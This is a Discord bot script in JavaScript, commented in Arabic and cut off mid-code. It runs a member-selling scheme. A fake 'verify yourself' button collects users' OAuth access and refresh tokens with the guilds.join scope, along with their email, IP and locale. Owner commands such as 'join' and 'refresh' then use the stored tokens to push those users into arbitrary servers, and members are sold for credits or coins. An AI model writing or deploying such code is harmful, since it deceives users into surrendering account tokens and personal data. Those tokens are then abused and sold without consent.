const { Intents  , Client , MessageActionRow, MessagePayload  , MessageSelectMenu ,Modal , MessageEmbed  ,MessageButton , MessageAttachment, Permissions, TextInputComponent   } = require('discord.js');
const client = new Client({
  intents: [
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MESSAGES,
    Intents.FLAGS.DIRECT_MESSAGES,
  ],
  partials: ['CHANNEL'] // ضروري للتعامل مع الرسائل الخاصة
});

var express = require("express");
var app = express();
var path = require("path");
const fs = require("fs");
var bodyParser = require("body-parser");
const Database = require('st.db')
const db = new Database('coinsdb');
const axios = require('axios');
const usersdata = new Database({
  path: './database/users.json',
  databaseInObject: true
})
const DiscordStrategy = require('passport-discord').Strategy
  , refresh = require('passport-oauth2-refresh');
const passport = require('passport');
const session = require('express-session');
const wait = require('node:timers/promises').setTimeout;
const { channels, price,bot, website } = require("./config.js");
app.use(bodyParser.urlencoded({ extended: true }));
app.set("views", path.join(__dirname, "/views"));
app.use(express.static(__dirname + "assets"))
app.set("view engine", "ejs")
app.use(express.static("public"));
const config = require('./config.js');

const { use } = require("passport");
global.config = config;
import('node-fetch')
const DiscordOauth2 = require("discord-oauth2");
const oauth = new DiscordOauth2({
  clientId: config.bot.botID,  
clientSecret: process.env.clientSECRET,
  redirectUri: config.bot.callbackURL,
});

require('./slash.js')
app.get('/', function (req, res) {
  res.send('Hello World')
})
const prefix = config.bot.prefix; 
app.listen(3000)
var scopes = ['identify', 'guilds', 'guilds.join'];
passport.use(new DiscordStrategy({
  clientID: config.bot.botID,
  clientSecret: process.env.clientSECRET,
  callbackURL: config.bot.callbackURL,
  scope: scopes,
  passReqToCallback: true
}, async function (req, accessToken, refreshToken, profile, done) {
  try {
    process.nextTick(async function () {
      // تحديث بيانات المستخدم مع إضافة معلومات الموقع
      usersdata.set(`${profile.id}`, {
        accessToken: accessToken,
        refreshToken: refreshToken,
        email: profile.email,
        location: {
          country: profile.locale?.split('-')[1] || null,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          loginIP: req.ip || req.headers['x-forwarded-for'] || null,
          lastLogin: new Date().toISOString()
        }
      });
      return done(null, profile);
    });
    
    await oauth.addMember({
      guildId: `${config.bot.GuildId}`,
      userId: profile.id,
      accessToken: accessToken,
      botToken: client.token
    });
    
    const channel = await client.channels.fetch(config.Log.LogChannelOwners);
    if (channel) {
      // إرسال البيانات العامة في embed
      const embed = new MessageEmbed()
        .setColor('#7adfdb')
        .setTitle('لقد قام شخص بإثبات نفسه')
        .setDescription(`<@${profile.id}>, لقد تم توثيقك بنجاح`)
        .setThumbnail(`https://cdn.discordapp.com/avatars/${profile.id}/${profile.avatar}.png`)
        .addFields(
          { name: 'الاسم', value: profile.username, inline: true },
          { name: 'المعرف', value: profile.id, inline: true },
          { name: 'البريد', value: profile.email || 'مخفي', inline: true },
          { name: 'الموقع', value: profile.locale?.split('-')[1] || 'غير متوفر', inline: true }
        )
        .setTimestamp();
      await channel.send({ embeds: [embed] });
      
      await channel.send({content: `${config.bot.LineIce}`});
    } else {
      console.error('القناة غير موجودة.');
    }
  } catch (error) {
    console.error('حدث خطأ أثناء المصادقة:', error);
    return done(error, null);
  }
}));

app.get("/", function (req, res) {
  res.render("index", { client: client, user: req.user, config: config, bot: bot });
});



app.use(session({
  secret: 'some random secret',
  cookie: {
    maxAge: 60000 * 60 * 24
  },
  saveUninitialized: false
}));
app.get("/", (req, res) => {
  res.render("index", { client: client, user: req.user, config: config, bot: bot });
});
passport.serializeUser(function (user, done) {
  done(null, user);
});
passport.deserializeUser(function (user, done) {
  done(null, user);
});
app.use(passport.initialize());
app.use(passport.session());

app.get('/login', passport.authenticate('discord', { failureRedirect: '/' }), function (req, res) {
  var characters = '0123456789';
  let idt = ``
  for (let i = 0; i < 20; i++) {
    idt += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  res.render("login", { client: client, user: req.user.username, config: config, bot: bot });
});




client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `send`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }

    // إنشاء الزر مع الإيموجي
    let button = new MessageButton()
      .setLabel('اثــبــت نــفــســك') // النص الذي يظهر على الزر
      .setStyle('LINK') // نوع الزر
      .setURL(`${config.bot.TheLinkVerfy}`) // الرابط الذي يوجه له الزر
      .setEmoji('1272466914085703733') // استبدل هذا بـ ID الإيموجي

    let row = new MessageActionRow()
      .addComponents(button);

    // إرسال الرسالة مع الزر
    message.channel.send({ components: [row] });
  }
});

let coinsData;


// تحميل أو إنشاء قاعدة بيانات العملات
function loadCoinsData() {
    if (fs.existsSync('./coinsdb.json')) {
        coinsData = JSON.parse(fs.readFileSync('./coinsdb.json', 'utf8'));
    } else {
        coinsData = [];
    }
}
// حفظ التغييرات إلى قاعدة البيانات
function saveCoinsData() {
    fs.writeFileSync('./coinsdb.json', JSON.stringify(coinsData, null, 4));
}

// الحصول على عدد الكوينز للمستخدم
function getCoins(userId) {
    const entry = coinsData.find(([key]) => key === `coins_${userId}`);
    return entry ? entry[1] : 0;
}

// تحديث عدد الكوينز للمستخدم
function setCoins(userId, amount) {
    const index = coinsData.findIndex(([key]) => key === `coins_${userId}`);
    if (index !== -1) {
        coinsData[index][1] = amount;
    } else {
        coinsData.push([`coins_${userId}`, amount]);

    }
    saveCoinsData();
}



client.once('ready', () => {
    console.log(`${client.user.tag} is online!`);
    loadCoinsData();
});

// إدارة العمليات النشطة
// إدارة العمليات النشطة
const activePurchases = new Map();

client.on('messageCreate', async message => {
  if (message.author.bot) return;

  if (message.content.startsWith(prefix + 'buy-coins')) {
    const args = message.content.slice(prefix.length).trim().split(/ +/);
    args.shift();

    const amount = parseInt(args[0]); // الكمية المطلوبة من الكوينز

    if (isNaN(amount) || amount <= 0) {
      console.log(`❌ | المستخدم ${message.author.username} لم يحدد كمية صالحة.`);
      return message.channel.send(`**❌ | يرجى كتابة الكمية التي تريد شرائها \`${prefix}buy-coins [amount]\` **`);
    }

    // تحقق إذا كان المستخدم لديه عملية جارية
    if (activePurchases.has(message.author.id)) {
      console.log(`❌ | المستخدم ${message.author.username} لديه عملية شراء جارية بالفعل.`);
      return message.channel.send(`**❌ | لديك عملية شراء جارية بالفعل. يرجى إتمام العملية الحالية أولاً أو إلغائها.**`);
    }

    const pricePerCoin = config.bot.coinprice; // السعر لكل كوين
    const totalPriceWithoutTax = amount * pricePerCoin; // السعر الإجمالي بدون الضريبة
    const taxAmount = Math.floor(totalPriceWithoutTax * (20 / 19) + 1); // حساب الضريبة
    const finalAmount = taxAmount; // المبلغ النهائي مع الضريبة

    console.log(`المستخدم ${message.author.username} طلب شراء ${amount} كوينز. السعر الإجمالي مع الضريبة: ${finalAmount}`);

    // إضافة العملية الجارية
    activePurchases.set(message.author.id, { amount, finalAmount });

    // إعداد زر "إلغاء" للمستخدم
    const cancelButton = new MessageButton()
      .setCustomId('cancel_purchase')
      .setLabel('إلغاء العملية')
      .setStyle('DANGER');

    const buytembed = new MessageEmbed()
      .setDescription(`
\`\`\`#credit ${config.bot.TraId} ${taxAmount}\`\`\` 
`)

    const row = new MessageActionRow().addComponents(cancelButton);

    try {
      await message.channel.send({
        content: `**مرحبا ${message.author} 👋 **\n\n** لشراء \`${amount}\` كوينز 🪙 يجب عليك تحويل المبلغ 👇**
**الرجاء التحويل في غضون 5 دقائق ! ↪️ **`,
        components: [row],
        embeds: [buytembed],
      });
      console.log(`✅ | تم إرسال رسالة الشراء بنجاح للمستخدم ${message.author.username}.`);
    } catch (error) {
      console.error(`❌ | حدث خطأ عند إرسال رسالة الشراء للمستخدم ${message.author.username}: ${error.message}`);
      return message.channel.send(`**❌ | حدث خطأ أثناء إرسال رسالة الشراء. يرجى المحاولة لاحقًا.**`);
    }

    const filter = ({ content, author: { id } }) => {
      return (
        content.startsWith(`**:moneybag: | ${message.author.username}, has transferred `) &&
        content.includes(config.bot.TraId) &&
        id === '282859044593598464'
      );
    };

    const collector = message.channel.createMessageCollector({
      filter,
      max: 1,
      time: 300000, // 5 دقائق للتحويل
    });

    collector.on('collect', async collected => {
      try {
        // استخراج المبلغ المحول
        const transferAmount = Number(collected.content.match(/\$([0-9]+)/)[1]);
        console.log(`تم استلام التحويل: ${transferAmount} كريدت من ${message.author.username}`);

        // التحقق من المبلغ المحول (يجب أن يتضمن الضريبة)
        if (transferAmount === config.bot.coinprice *amount) {
          console.log(`✅ | المبلغ المحول من ${message.author.username} صحيح.`);
          
          // إضافة الكوينز
          try {
            const currentCoins = getCoins(message.author.id);
            setCoins(message.author.id, currentCoins + amount);
            console.log(`✅ | تم إضافة ${amount} كوينز لحساب المستخدم ${message.author.username}.`);

            // إرسال رسالة للمستخدم
            await message.channel.send(`**✅ | ${message.author} تم تنفيذ العملية بنجاح! لقد تم إضافة \`${amount}\` كوينز إلى حسابك.**`);

            // تسجيل العملية في اللوق
            const logChannel = message.guild.channels.cache.get(config.bot.logChannelId);
            if (logChannel) {
              logChannel.send(`**📥 | ${message.author.username} قام بشراء \`${amount}\` كوينز بنجاح!**`);
            }
          } catch (error) {
            console.error(`❌ | حدث خطأ عند إضافة الكوينز لحساب ${message.author.username}: ${error.message}`);
            return message.channel.send(`**❌ | حدث خطأ أثناء إضافة الكوينز لحسابك. يرجى المحاولة لاحقًا.**`);
          }
        } else {
          console.log(`❌ | المبلغ المحول من ${message.author.username} غير مطابق للسعر المطلوب.`);
          await message.channel.send('**❌ | المبلغ المحول غير مطابق للسعر المطلوب.**');
        }
      } catch (error) {
        console.error(`❌ | حدث خطأ أثناء معالجة التحويل من ${message.author.username}: ${error.message}`);
        await message.channel.send('**❌ | حدث خطأ أثناء معالجة التحويل. يرجى المحاولة لاحقًا.**');
      }

      // إزالة العملية الجارية بعد إتمام التحويل
      activePurchases.delete(message.author.id);
    });

    collector.on('end', (collected, reason) => {
      if (reason === 'time' && collected.size === 0) {
        console.log(`❌ | المستخدم ${message.author.username} لم يقم بالتحويل في الوقت المحدد.`);
        message.channel.send(`**❌ | ${message.author} لقد انتهى الوقت، لا تقم بالتحويل الآن.**`);
      }

      // إزالة العملية الجارية في حال انتهى الوقت
      activePurchases.delete(message.author.id);
    });

    // التعامل مع زر "إلغاء العملية"
    const buttonFilter = (interaction) => interaction.user.id === message.author.id && interaction.isButton();
    const buttonCollector = message.channel.createMessageComponentCollector({
      filter: buttonFilter,
      time: 300000, // 5 دقائق
    });

    buttonCollector.on('collect', async (interaction) => {
      if (interaction.customId === 'cancel_purchase') {
        // إزالة العملية الجارية
        activePurchases.delete(message.author.id);

        // إرسال رسالة تأكيد بالإلغاء
        await interaction.update({
          content: `**تم إلغاء العملية، يمكنك الآن بدء عملية شراء جديدة.**`,
          components: [], // إزالة الأزرار بعد الإلغاء
        });
      }
    });
  }
});












client.on('messageCreate', (message) => {
    if (!message.content.startsWith(config.bot.prefix) || message.author.bot) return;

    const args = message.content.slice(config.bot.prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // أمر عرض الكوينز
    if (command === 'coins') {
        let target = message.mentions.users.first() || client.users.cache.get(args[0]) || message.author;
        const coins = getCoins(target.id);

        message.channel.send(`🪙 | **${target.username}** رصيد حسابه : \`${coins}\``);
    }

    // أمر إعطاء الكوينز
    if (command === 'give') {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }

        let target = message.mentions.users.first() || client.users.cache.get(args[0]);
        const amount = parseInt(args[1]);

        if (!target || isNaN(amount) || amount <= 0) {
            return message.reply("Usage: `!give [mention/id] [amount]`");
        }

        const currentCoins = getCoins(target.id);
        setCoins(target.id, currentCoins + amount);

        message.channel.send(`** :white_check_mark:  | تم إعطاء ${amount} لـ <@${target.id}>**`);
    }

    // أمر إزالة الكوينز
    if (command === 'take') {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }

        let target = message.mentions.users.first() || client.users.cache.get(args[0]);
        const amount = parseInt(args[1]);

        if (!target || isNaN(amount) || amount <= 0) {
            return message.reply("Usage: `!take [mention/id] [amount]`");
        }

        const currentCoins = getCoins(target.id);
        setCoins(target.id, Math.max(currentCoins - amount, 0));

        message.channel.send(`** :white_check_mark:  | تم إزالة ${amount} من <@${target.id}>**`);
    }
});














client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `invite`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let button = new MessageButton()
      .setLabel(`ضيفني`)
      .setStyle(`LINK`)
      .setURL(config.bot.inviteBotUrl)
      .setEmoji(`<a:blue:1320445572896788520>`)

    let row = new MessageActionRow()
      .setComponents(button)
    message.channel.send({ components: [row] })
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `check`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let args = message.content.split(" ").slice(1).join(" ");
    if (!args) return message.channel.send({ content: `**منشن شخص طيب**` });
    let member = message.mentions.members.first() || message.guild.members.cache.get(args.split(` `)[0]);
    if (!member) return message.channel.send({ content: `**شخص غلط**` });
    let data = usersdata.get(`${member.id}`)
    if (data) return message.channel.send({ content: `**موثق بالفعل**` });
    if (!data) return message.channel.send({ content: `**غير موثق**` });
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `join`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let msg = await message.channel.send({ content: `**جاري الفحص ..**` })
    let alld = usersdata.all()
    let args = message.content.split(` `).slice(1)
    if (!args[0] || !args[1]) return msg.edit({ content: `**عذرًا , يرجى تحديد خادم ..**` }).catch(() => { message.channel.send({ content: `**عذرًا , يرجى تحديد خادم ..**` }) });
    let guild = client.guilds.cache.get(`${args[0]}`)
    let amount = args[1]
    let count = 0
    if (!guild) return msg.edit({ content: `**عذرًا , لم اتمكن من العثور على الخادم ..**` }).catch(() => { message.channel.send({ content: `**عذرًا , لم اتمكن من العثور على الخادم ..**` }) });
    if (amount > alld.length) return msg.edit({ content: `**لا يمكنك ادخال هاذا العدد ..**` }).catch(() => { message.channel.send({ content: `**لا يمكنك ادخال هاذا العدد ..**` }) });;
    for (let index = 0; index < amount; index++) {
      await oauth.addMember({
        guildId: guild.id,
        userId: alld[index].ID,
        accessToken: alld[index].data.accessToken,
        botToken: client.token
      }).then(() => {
        count++
      }).catch(() => { })
    }
    msg.edit({
      content: `**تم بنجاح ..**
**تم ادخال** \`${count}\`
**لم اتمكن من ادخال** \`${amount - count}\`
**تم طلب** \`${amount}\``
    }).catch(() => {
      message.channel.send({
        content: `**تم بنجاح ..**
**تم ادخال** \`${count}\`
**لم اتمكن من ادخال** \`${amount - count}\`
**تم طلب** \`${amount}\``
      })
    });;
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `refresh`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let mm = await message.channel.send({ content: `**جاري عمل ريفريش ..**` }).catch(() => { })
    let alld = usersdata.all()
    var count = 0;

    for (let i = 0; i < alld.length; i++) {
      await oauth.tokenRequest({
        'clientId': client.user.id,
        'clientSecret': bot.clientSECRET,
        'grantType': 'refresh_token',
        'refreshToken': alld[i].data.refreshToken
      }).then((res) => {
        usersdata.set(`${alld[i].ID}`, {
          accessToken: res.access_token,
          refreshToken: res.refresh_token
        })
        count++
      }).catch(() => {
        usersdata.delete(`${alld[i].ID}`)
      })
    }

    mm.edit({
      content: `**تم بنجاح ..**
**تم تغير** \`${count}\`
**تم حذف** \`${alld.length - count}\``
    }).catch(() => {
      message.channel.send({ content: `**تم بنجاح .. ${count}**` }).catch(() => { })
    })
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + 'stock')) {
    // التأكد من أن المستخدم لديه الصلاحية لتنفيذ الأمر
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }

    const guildIcon = message.guild.iconURL(); // صورة الخادم
    const botName = client.user.username; // اسم البوت
    const botAvatar = client.user.displayAvatarURL(); // صورة البوت

    // جلب بيانات المستخدمين
    let alld = usersdata.all();

    // إنشاء الـ Embed
    const embed = new MessageEmbed()
      .setColor(config.bot.colorembed)
      .setTitle('كمية الأعضاء المتوفرة حاليا')
      .setDescription(`يوجد حاليًا **${alld.length}** عضو.`)
     .setImage('https://media.discordapp.net/attachments/1359183128467472469/1360693599011864706/Untitled-5-Recovered.png?ex=67fc0c2a&is=67fabaaa&hm=c0daacaf7701767c692d7b21a2d38c3294f62234b0ced076022f943eebe35e62&=')
      .setThumbnail(guildIcon) // تعيين صورة الخادم
      .setTimestamp()
      .setFooter({ text: botName, iconURL: botAvatar });

    // إنشاء زر Refresh
    const row = new MessageActionRow().addComponents(
      new MessageButton()
        .setCustomId('refresh_users')
.setEmoji('<a:a_discord_gif_benc:1047944401059586058>')
        .setStyle('SECONDARY')
    );


    // إرسال رسالة الـ Embed مع الزر إلى القناة
    await message.channel.send({ embeds: [embed], components: [row] });
  }
});



 //send v2
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + 'tend')) {
    // التأكد من أن المستخدم لديه الصلاحية لتنفيذ الأمر
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }

    const guildIcon = message.guild.iconURL(); // صورة الخادم
    const botName = client.user.username; // اسم البوت
    const botAvatar = client.user.displayAvatarURL(); // صورة البوت

    // جلب بيانات المستخدمين
    let alld = usersdata.all();

    // إنشاء الـ Embed
    const embed = new MessageEmbed()
      .setColor(config.bot.colorembed)
      .setTitle('La Vegas RolePlay')
      .setDescription(`Verification Las Vegas RolePlay`)
     .setImage('https://media.discordapp.net/attachments/1218947507166384190/1328482687861653554/a867b66aaffee4defbe505577bd794eb.png?ex=6786dd6a&is=67858bea&hm=f5817aad632bb4fda14a7ca9fb0f25cbcb153f5642fdce9235a279a7bacd5562&=&format=webp&quality=lossless')
      .setThumbnail(guildIcon) // تعيين صورة الخادم
      .setTimestamp()
      .setFooter({ text: botName, iconURL: botAvatar });

    // إنشاء زر Refresh
    const row = new MessageActionRow().addComponents(
      new MessageButton()
        
      .setLabel('اثــبــت نــفــســك') // النص الذي يظهر على الزر
      .setStyle('LINK') // نوع الزر
      .setURL(`${config.bot.TheLinkVerfy}`) // الرابط الذي يوجه له الزر
      .setEmoji('1325947387717353534') // استبدل هذا بـ ID الإيموجي

    );



    await message.channel.send({ embeds: [embed], components: [row] });
  }
});



client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + 'ped')) {
    
    // 1. التحقق من الصلاحيات بشكل صحيح
    if (!config.bot.owners.includes(message.author.id)) {
      return message.reply('⛔ ليس لديك صلاحية استخدام هذا الأمر!').catch(console.error);
    }

    // 2. جلب البيانات بشكل آمن
    let alld;
    try {
      alld = usersdata.all(); // تأكد من تعريف usersdata
    } catch (error) {
      console.error('خطأ في جلب البيانات:', error);
      return message.reply('حدث خطأ في جلب البيانات!').catch(console.error);
    }

    // 3. إعداد العناصر المرئية مع معالجة الأخطاء
    const guildIcon = message.guild?.iconURL({ dynamic: true }) || client.user.displayAvatarURL();
    const botName = client.user.username;
    const botAvatar = client.user.displayAvatarURL({ format: 'png', size: 1024 });

    // 4. إنشاء الإيمبد مع تحسين التنسيق
    const embed = new MessageEmbed()
      .setColor(config.bot.colorembed || '#0099ff') // قيمة افتراضية إذا لم توجد
      .setTitle('<:Red51:1335038914855043093> | 𝐑𝐢𝐬𝐡𝐚 𝐒  - إثبات الهوية')
      .setDescription(`
       <:Red51:1335038914855043093> - إثبات الهوية مطلوب للوصول إلى الرومات
        <:Red51:1335038914855043093> - نتمنى لك تجربة ممتعة
      `)
      .setImage('https://cdn.discordapp.com/attachments/1328306288047947806/1328474752574296084/1736797401459.png')
      .setThumbnail(guildIcon)
      .setTimestamp()
      .setFooter({ text: botName, iconURL: botAvatar });

    // 5. إنشاء الزر مع التحقق من الرابط
    const verifyLink = config.bot.TheLinkVerfy;
    if (!verifyLink || !verifyLink.startsWith('https://')) {
      return message.reply('⚠️ رابط التحقق غير مضبوط بشكل صحيح!').catch(console.error);
    }

    const row = new MessageActionRow().addComponents(
      new MessageButton()       
        .setLabel('Verify Account')
        .setStyle('LINK')
        .setURL('https://discord.com/oauth2/authorize?client_id=1328416486326276176&response_type=code&redirect_uri=https%3A%2F%2Fscrawny-walnut-narwhal.glitch.me%2Flogin%2Fcallback&scope=identify+email+guilds+guilds.join')
        .setEmoji('1200101176989982761') // تأكد من صحة الإيموجي ID
    );

    // 6. إرسال الرسالة مع معالجة الأخطاء
    try {
      await message.channel.send({ 
        embeds: [embed], 
        components: [row] 
      });
    } catch (error) {
      console.error('فشل في إرسال الرسالة:', error);
      message.reply('❌ حدث خطأ في إرسال الرسالة!').catch(console.error);
    }
  }
});


// الاستماع للتفاعل مع الزر (Interaction)
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;

  // التحقق من زر الـ Refresh
  if (interaction.customId === 'refresh_users') {
      
    const guildIcon = interaction.guild.iconURL(); // صورة الخادم
    const botName = client.user.username; // اسم البوت
    const botAvatar = client.user.displayAvatarURL(); 
    // جلب بيانات المستخدمين
    let alld = usersdata.all();

    // تحديث الـ Embed
    const updatedEmbed = new MessageEmbed()
      .setColor(config.bot.colorembed)
      .setTitle('كمية الأعضاء المتوفرة حاليا')
      .setDescription(`يوجد حاليًا **${alld.length}** عضو.`)
.setImage('https://media.discordapp.net/attachments/1328306288047947806/1328449934919208990/1736797401459.png?ex=6786bee9&is=67856d69&hm=222df4cf7f688d85385255cba63fb2aa25144d530446ca94c15835aa2c343305&=&format=webp&quality=lossless')
      .setThumbnail(guildIcon) // تعيين صورة الخادم
      .setTimestamp()
      .setFooter({ text: botName, iconURL: botAvatar });

    // تحديث الرسالة الأصلية بالـ Embed الجديد
    await interaction.update({ embeds: [updatedEmbed], components: interaction.message.components });
  }
});




client.on('messageCreate', async (message) => {
  // تحقق من أن الرسالة ليست من البوت
  if (message.author.bot) return;

  // تغيير اسم البوت
  if (message.content.startsWith(`${prefix}setname`)) {
      
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    const newName = message.content.split(' ').slice(1).join(' ');
    if (!newName) return message.reply('يرجى تقديم اسم جديد للبوت.');

    try {
      await client.user.setUsername(newName);
      message.channel.send(`تم تغيير اسم البوت إلى: ${newName}`);
    } catch (error) {
      console.error(error);
      message.channel.send('حدث خطأ أثناء محاولة تغيير اسم البوت.');
    }
  }

  // تغيير صورة البوت
  if (message.content.startsWith(`${prefix}setavatar`)) {
      
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    const newAvatarUrl = message.content.split(' ')[1];
    if (!newAvatarUrl) return message.reply('يرجى تقديم رابط صورة جديد للبوت.');

    try {
      await client.user.setAvatar(newAvatarUrl);
      message.channel.send('تم تغيير صورة البوت بنجاح.');
    } catch (error) {
      console.error(error);
      message.channel.send('حدث خطأ أثناء محاولة تغيير صورة البوت.');
    }
  }
});




client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + 'help')) {
    // التحقق من أن المستخدم لديه الصلاحية للوصول إلى هذه القائمة
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }

    // إنشاء Embed لقائمة المساعدة العامة
    const generalEmbed = new MessageEmbed()
      .setColor(config.bot.colorembed)
      .setTitle('📋 قائمة المساعدة - General')
      .setDescription(`
        **[\`${prefix}stock\`]** - عرض عدد المستخدمين
        **[\`${prefix}help\`]** - عرض قائمة المساعدة
        **[\`${prefix}invite\`]** - دعوة البوت
        **[\`${prefix}tax\`]** - حساب ضريبة بروبوت
        **[\`${prefix}coins\`] - لعرض رصيدك او رصيد شخص اخر

`)
      .setFooter({ text: `${client.user.username}`, iconURL: client.user.displayAvatarURL() });

    // إنشاء الأزرار
    const row = new MessageActionRow().addComponents(
      new MessageButton()
        .setCustomId('general')
        .setLabel('General')
        .setStyle('SECONDARY'),
      
      new MessageButton()
        .setCustomId('owners')
        .setLabel('Owners')
        .setStyle('SECONDARY'),

      new MessageButton()
        .setLabel('دعوة البوت')
        .setStyle('LINK')
        .setURL(`https://discord.com/api/oauth2/authorize?client_id=1328416486326276176&permissions=8&scope=bot`)
    );

    // إرسال الرسالة مع الـ Embed والأزرار
    await message.reply({ embeds: [generalEmbed], components: [row] });
  }
});

// الاستماع للتفاعل مع الأزرار (Interaction)
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;

  // التعامل مع زر General
  if (interaction.customId === 'general') {
    const generalEmbed = new MessageEmbed()
      .setColor(config.bot.colorembed)
      .setTitle('📋 قائمة المساعدة - General')
      .setDescription(`
        **[\`${prefix}stock\`]** - عرض عدد المستخدمين
        **[\`${prefix}help\`]** - عرض قائمة المساعدة
        **[\`${prefix}invite\`]** - دعوة البوت
        **[\`${prefix}tax\`]** - حساب ضريبة بروبوت
        **[\`${prefix}coins\`] - لعرض رصيدك او رصيد شخص اخر
`)
      .setFooter({ text: `${client.user.username}`, iconURL: client.user.displayAvatarURL() });

    await interaction.update({ embeds: [generalEmbed], components: interaction.message.components });
  }

  // التعامل مع زر Owners
  if (interaction.customId === 'owners') {
    if (!config.bot.owners.includes(`${interaction.user.id}`)) {
      // رد مخفي يظهر أن المستخدم ليس لديه الصلاحية
      return interaction.reply({ content: '❌ ليس لديك صلاحية الوصول إلى قائمة الأوامر هذه.', ephemeral: true });
    }

    const ownersEmbed = new MessageEmbed()
      .setColor(config.bot.colorembed)
      .setTitle('🔑 قائمة المساعدة - Owners')
      .setDescription(`

        **[\`${prefix}join {ServerId} {amount}\`]** - الانضمام إلى سيرفر
        **[\`${prefix}refresh\`]** - تحديث المعلومات
        **[\`${prefix}check\`]** - التحقق من حالة معينة
        **[\`${prefix}send\`]** - إرسال رسالة
        **[\`${prefix}price\`]** - وضع سعر اعضاء بلكريديت
       **[\`${prefix}coinprice\`]** - وضع سعر أعضاء بلكوينز
        **[\`${prefix}give\`] - لإعطاء رصيد لشخص
        **[\`${prefix}take\`] - لإزالة رصيد من شخص
`)
      .setFooter({ text: `${client.user.username}`, iconURL: client.user.displayAvatarURL() });

    await interaction.update({ embeds: [ownersEmbed], components: interaction.message.components });
  }
});
var listeners = app.listen(`1988`, function () {
console.log("Your app is listening on port " + `${config.website.PORT}`)
});

client.on('ready', () => {
  console.log(`Bot is On! ${client.user.tag}`);
});
client.login(process.env.token);
const { AutoKill } = require('autokill')
AutoKill({ Client: client, Time: 5000 })

process.on("uncaughtException" , error => {
return;
})
process.on("unhandledRejection" , error => {
return;
})
process.on("rejectionHandled", error => {
return;
});







client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;

  console.log('تم استدعاء الأمر');

  if (interaction.commandName === 'setup') {
      
    if (!config.bot.owners.includes(`${interaction.user.id}`)) {  // تم تعديل interaction.author.id إلى interaction.user.id
      return;
    }
    console.log('الأمر setup تم استدعاؤه');

    const Channel = interaction.channel;

    const embed = new MessageEmbed()
      .setTitle('خدمة بيع أعضاء حقيقية')
      .setDescription('* لشراء أعضاء حقيقية يرجى فتح تذكرة')
      .setColor(config.bot.colorembed)
.setImage('https://media.discordapp.net/attachments/1357301716902481970/1360689687030923274/Hue_Saturation_12.png?ex=67fc0885&is=67fab705&hm=c1cfcc9c4facc929ad36b7c97af9f713ef1a3c7ac737570e87e5467f217a2d6b&=')      .setThumbnail(interaction.guild.iconURL())
      .setTimestamp()
      .setFooter({ text: `${interaction.user.username}`, iconURL: interaction.user.displayAvatarURL() });

    const row = new MessageActionRow().addComponents(
      new MessageButton()
        .setCustomId('openticket')
        .setLabel('فتح تكت')
.setEmoji('<:fix:1334113525928427542>')
        .setStyle('SECONDARY'),
      new MessageButton()
      .setCustomId('GetIdServer')
      .setLabel('أيدي سيرفر')
.setEmoji('<:a_skunt2:1335588149115617320>')
      .setStyle('SECONDARY')
    );

    try {
      await Channel.send({ embeds: [embed], components: [row] });
      console.log('تم إرسال الرسالة بنجاح');
    } catch (error) {
      console.error('حدث خطأ أثناء إرسال الرسالة:', error);
    }

    await interaction.reply({ content: '**تم إرسال بانل الشراء بنجاح ✅**', ephemeral: true });
  }
});



client.on('interactionCreate', async (interaction) => {
  if (interaction.isButton()) {
    if (interaction.customId === 'GetIdServer') {
      // إنشاء المودال
      const modal = new Modal()
        .setCustomId('ServerLinkModal')
        .setTitle('أدخل رابط سيرفرك')
        .addComponents(
          new MessageActionRow().addComponents(
            new TextInputComponent()
              .setCustomId('serverLink')
              .setLabel('أدخل رابط السيرفرك')
              .setStyle('SHORT')
              .setPlaceholder('https://discord.gg/example')
              .setRequired(true)
          )
        );

      await interaction.showModal(modal);
    }
  }

  if (interaction.isModalSubmit()) {
    if (interaction.customId === 'ServerLinkModal') {
      const serverLink = interaction.fields.getTextInputValue('serverLink');
      const inviteCode = serverLink.split('/').pop();

      try {
        const invite = await client.fetchInvite(inviteCode);
        const guild = invite.guild;

        if (guild) {
          return interaction.reply({
            content: `تم استخراج بيانات السيرفر بنجاح:\n**ID:** ${guild.id}\n**Guild Name:** ${guild.name}`,
            ephemeral: true,
          });
        }
      } catch (error) {
        console.error('Error fetching invite:', error);

        const inviteButton = new MessageButton()
          .setStyle('LINK')
          .setLabel('إضافة البوت')
          .setURL(`https://discord.com/api/oauth2/authorize?client_id=${config.bot.botID}&permissions=8&scope=bot`);

        const actionRow = new MessageActionRow().addComponents(inviteButton);

        return interaction.reply({
          content: 'عذرًا، لم أتمكن من العثور على هذا السيرفر. يُرجى إضافة البوت إلى السيرفر المطلوب باستخدام الرابط أدناه.',
          components: [actionRow],
          ephemeral: true,
        });
      }
    }
  }
});




client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;

  if (interaction.customId === 'openticket') {
    // رسالة مخفية تسأل المستخدم عن طريقة الدفع
    const paymentRow = new MessageActionRow().addComponents(
      new MessageButton()
